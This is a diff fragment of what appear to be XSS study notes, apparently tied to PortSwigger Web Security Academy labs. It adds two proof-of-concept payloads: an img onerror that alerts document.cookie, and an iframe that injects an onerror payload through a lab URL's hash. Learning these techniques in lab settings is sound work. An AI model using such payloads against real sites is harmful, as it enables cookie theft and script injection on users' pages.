@@ -110,6 +110,9 @@
       });
     </script>
   ```
+  exploit:
+  - `<img src=x onerror=alert(document.cookie)>`
+  - `<iframe src="https://0a13001f041c45ba8030035b006d0065.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
 # 3. Stored XSS
 
 # 4. Reflected XSS
